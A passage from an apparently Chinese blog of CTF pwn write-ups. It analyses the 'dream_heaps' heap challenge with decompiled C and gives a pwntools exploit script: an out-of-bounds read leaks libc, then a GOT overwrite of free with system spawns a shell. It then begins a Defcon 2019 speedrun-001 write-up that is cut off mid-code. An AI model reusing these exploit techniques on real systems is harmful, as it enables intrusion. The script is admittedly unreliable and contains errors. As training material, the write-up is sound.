class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/andy/Workspace/nightmare/dream_heap/dream_heaps&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">===========================================================</span><br><span class="line">dream_heaps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9968ee0656a4b24cb6bf5ebc1f8f37d4ddd0078d, not stripped</span><br><span class="line">===========================================================</span><br><span class="line">Online dream catcher! Write dreams down and come back to them later!</span><br><span class="line"></span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 1</span><br><span class="line">How long is your dream?</span><br><span class="line">100</span><br><span class="line">What are the contents of this dream?</span><br><span class="line">Hello</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 2</span><br><span class="line">Which dream would you like to read?</span><br><span class="line">0</span><br><span class="line">Hello</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 3</span><br><span class="line">Which dream would you like to change?</span><br><span class="line">0</span><br><span class="line">Hello World</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 2</span><br><span class="line">Which dream would you like to read?</span><br><span class="line">0</span><br><span class="line">Hello World</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure><p>简单来说就是可以自己声明有多长的内容要记录，然后系统将内容保存到申请的堆空间里面，并不是直接写入硬盘；</p><p>这里是对于<code>main</code>函数进行的反编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 option;</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Online dream catcher! Write dreams down and come back to them later!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1: Write dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2: Read dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3: Edit dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4: Delete dream&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;5: Quit\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;option);</span><br><span class="line">  <span class="keyword">switch</span>(option) &#123;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not an option!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    new_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_dream();</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    edit_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    delete_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                  <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_dream</code>函数是允许我们进行写的，所以我们切入点就在这里，对应的反编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">new_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> sizePtr;</span><br><span class="line">  <span class="type">void</span> *heapPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  sizePtr = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How long is your dream?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;sizePtr);</span><br><span class="line">  heapPtr = <span class="built_in">malloc</span>((<span class="type">long</span>)sizePtr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What are the contents of this dream?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,heapPtr,(<span class="type">long</span>)sizePtr);</span><br><span class="line">  *(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)INDEX * <span class="number">8</span>) = heapPtr;</span><br><span class="line">  *(<span class="type">int</span> *)(SIZES + (<span class="type">long</span>)INDEX * <span class="number">4</span>) = sizePtr;</span><br><span class="line">  INDEX = INDEX + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数还是比较好理解的就不多讲解了；其中有两个bss段地址，<code>HEAP_PTRS=0x06020a0</code>，<code>SIZE=0x06020e0</code>，<code>INDEX=0x060208c</code></p><p>那么接下来我在看我们可以控制读的函数<code>read_dream</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">read_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  undefined8 dreamPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to read?&quot;</span>);</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;num);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; num) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm you skipped a few nights...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    dreamPtr = *(undefined8 *)(HEAP_PTRS + (<span class="type">long</span>)num * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,dreamPtr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数提示我们输入<code>num</code>的值来获取到<code>dreamPtr</code>的地址；这里简单的做了一个越界检查，检测到我们输入的num数大于了我们正常存储的INDEX数量后就会输出<code>Hmm you skipped a few nights...</code>，我说过了这只是一个简单的越界检查，所以我们还是可以读取到bss segement<code>HEAP_PTR</code>之前的内容</p><p>接下来看编辑函数<code>edit_dream</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="type">int</span> sizePtr;</span><br><span class="line">  <span class="type">void</span> *dreamPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to change?&quot;</span>);</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;num);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; num) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven\&#x27;t had this dream yet...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    dreamPtr = *(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)num * <span class="number">8</span>);</span><br><span class="line">    sizePtr = *(<span class="type">int</span> *)(SIZES + (<span class="type">long</span>)num * <span class="number">4</span>);</span><br><span class="line">    read(<span class="number">0</span>,dreamPtr,(<span class="type">long</span>)sizePtr);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)dreamPtr + (<span class="type">long</span>)sizePtr) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于<code>delete_dream</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line"> </span><br><span class="line">  lVar1 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to delete?&quot;</span>);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400b60,&amp;index);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; index) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope, you can\&#x27;t delete the future.&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)index * <span class="number">8</span>));</span><br><span class="line">    *(undefined8 *)(HEAP_PTRS + (<span class="type">long</span>)index * <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (lVar1 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是很简单的获取字符串ptr和存储大小ptr，然后分别进行释放和数字覆盖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./dream_heaps&#x27;)</span><br><span class="line">elf=ELF(&#x27;./dream_heaps&#x27;)</span><br><span class="line">libc=ELF(&#x27;/usr/lib/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">puts = libc.sym[&#x27;puts&#x27;]</span><br><span class="line">bss_SIZE = 0x06020e0</span><br><span class="line">bss_HEAP_PTRS = 0x06020a0</span><br><span class="line">bss_INDEX = 0x060208c</span><br><span class="line"></span><br><span class="line">def write(content,size):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;1&#x27;);</span><br><span class="line">    p.sendlineafter(b&#x27;dream?&#x27;,str(size));</span><br><span class="line">    p.sendlineafter(b&#x27;dream?&#x27;,content);</span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;read?&#x27;,str(index))</span><br><span class="line">    leak = p.recvuntil(b&#x27;What&#x27;)</span><br><span class="line">    #Delete trash data</span><br><span class="line">    leak = leak.replace(b&#x27;What&#x27;,b&quot;&quot;)</span><br><span class="line">    leak = leak.replace(b&#x27;\x0a&#x27;,b&quot;&quot;)</span><br><span class="line">    leak = leak.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    log.info(&quot;Leak:&quot;+hex(leak))</span><br><span class="line">    return leak</span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;change?&#x27;,str(index))</span><br><span class="line">    p.sendline(content[:6])</span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;delete?&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">offset = bss_HEAP_PTRS - elf.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">log.info(&quot;leak puts address payload:&quot;+str(-offset//8))</span><br><span class="line">puts_addr=read(-offset//8)</span><br><span class="line">libc_base=puts_addr-elf.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">write(b&#x27;/bin/sh\x00&#x27;,0x10)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x20)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x30)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x40)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x50)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x60)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x70)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x80)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x90)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xa0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xb0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xc0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xd0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xe0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xf0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x11)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x22)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x18)</span><br><span class="line">write(b&#x27;0&#x27;*10, elf.got[&#x27;free&#x27;])</span><br><span class="line">write(b&#x27;0&#x27;*10, 00)</span><br><span class="line"></span><br><span class="line">edit(b&#x27;0&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里wp是nightmare上的不知道是不是libc版本的原因，我在利用<code>index abuse</code>的时候，只要我的负数过大就会出现<code>segmentation fault (core dumped)  ./dream_heaps</code></p><p>所以直接说思路了，就是直接利用数组越界漏洞泄露出<code>puts</code>函数的真实地址，然后计算出libc_base的地址好让我们可以运行system函数，然后我们再把<code>/bin/sh\x00</code>写入bss段，把<code>free</code>GOT表覆盖为system的真实地址，我们在释放index处的堆空间的时候就会执行<code>system(&quot;/bin/sh&quot;);</code>，当然这里的index就是shell字段</p><p>我发现这样整段整段记录一大堆题目效率确实是低，一般的时间都在写过程，留给我思考的时间非常少，所以之后我都尽量避免写全过程，抓重点记录知识点</p>]]></content>
      
      
      
        <tags>
            
            <tag> read document </tag>
            
            <tag> training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-commonly-training</title>
      <link href="/2023/01/08/pwn-commonly-break/"/>
      <url>/2023/01/08/pwn-commonly-break/</url>
      
        <content type="html"><![CDATA[<h1 id="练习"><a class="markdownIt-Anchor" href="#练习"></a> 练习</h1><p>打比赛发现很多还不会，于是跟着文档学习新内容和新思路了</p><h2 id="defcon-quals-2019-speedrun1"><a class="markdownIt-Anchor" href="#defcon-quals-2019-speedrun1"></a> Defcon Quals 2019 Speedrun1</h2><p>文件下载：<a href="/cyber/pwn/speedrun-001">speedrun-001</a><br />首先查看文件保护机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>运行主程序</p><ul><li>第一种情况，输入时间过长</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello brave new challenger</span><br><span class="line">Any last words?</span><br><span class="line">zsh: alarm      ./speedrun-001</span><br></pre></td></tr></table></figure><blockquote><p>受不了alarm函数可以直接用isnan替换就行，不会影响原程序运行<code>sed -i s/alarm/isnan/g ./speedrun-001</code>，不过这个只针对能够正确读取到elf文件的alarm符号才行，一般动态链接的程序都没有问题，这里不行，解决方法暂时放一放（手速快可以拿到flag）</p></blockquote><ul><li>第二种情况，完整输入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hello brave new challenger</span><br><span class="line">Any last words?</span><br><span class="line">i don&#x27;t want to die here.</span><br><span class="line">This will be the last thing that you say: i don&#x27;t want to die here.</span><br><span class="line"></span><br><span class="line">Alas, you had no luck today.</span><br></pre></td></tr></table></figure><p>文档里面还是有很多东西的，比如<code>breaktrace</code>查看断点地址，意思是gdb在调试的时候我们如果接收到了输入提示我们可以直接Ctrl C然后<code>bt</code>就可以看到我们程序是运行到什么地方让我们必须输入。还有一个就是Ghidra的快捷键g可以直接跳转，当然也可以直接点击这里查看Ghidra快捷键，官方文档还是很全的，而且毕竟是开源所以社区也很大。不懂得可以直接<code>F1</code>，里面有详细的功能介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line">#0  0x00000000004498ae in ?? ()</span><br><span class="line">#1  0x0000000000400b90 in ?? ()</span><br><span class="line">#2  0x0000000000400c1d in ?? ()</span><br><span class="line">#3  0x00000000004011a9 in ?? ()</span><br><span class="line">#4  0x0000000000400a5a in ?? ()</span><br></pre></td></tr></table></figure><p><strong>逐个查看后可以发现<code>FUN_00400bc1</code>是主程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">undefined8</span><br><span class="line"><span class="title function_">FUN_00400bc1</span><span class="params">(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,</span></span><br><span class="line"><span class="params">            undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">short</span> *psVar1;</span><br><span class="line">  float10 *pfVar2;</span><br><span class="line">  undefined8 extraout_RDX;</span><br><span class="line">  undefined8 extraout_RDX_00;</span><br><span class="line">  undefined8 extraout_RDX_01;</span><br><span class="line">  undefined8 extraout_RDX_02;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  <span class="type">char</span> *pcVar4;</span><br><span class="line">  float10 *in_R8;</span><br><span class="line">  <span class="type">long</span> in_R9;</span><br><span class="line">  undefined8 uVar5;</span><br><span class="line">  </span><br><span class="line">  pfVar2 = (float10 *)<span class="number">0x0</span>;</span><br><span class="line">  pcVar3 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  FUN_00410590(&amp;DAT_006b9360,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,(<span class="type">int</span> *)in_R8,in_R9);</span><br><span class="line">  pcVar4 = <span class="string">&quot;DEBUG&quot;</span>;</span><br><span class="line">  psVar1 = FUN_0040e790((<span class="type">short</span> *)<span class="string">&quot;DEBUG&quot;</span>);</span><br><span class="line">  uVar5 = extraout_RDX;</span><br><span class="line">  <span class="keyword">if</span> (psVar1 == (<span class="type">short</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    pcVar4 = (<span class="type">char</span> *)<span class="number">0x5</span>;</span><br><span class="line">    FUN_00449040();</span><br><span class="line">    uVar5 = extraout_RDX_00;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar5 = FUN_00400b4d(pcVar4,pcVar3,uVar5,pfVar2,(<span class="type">long</span>)in_R8,in_R9);</span><br><span class="line">  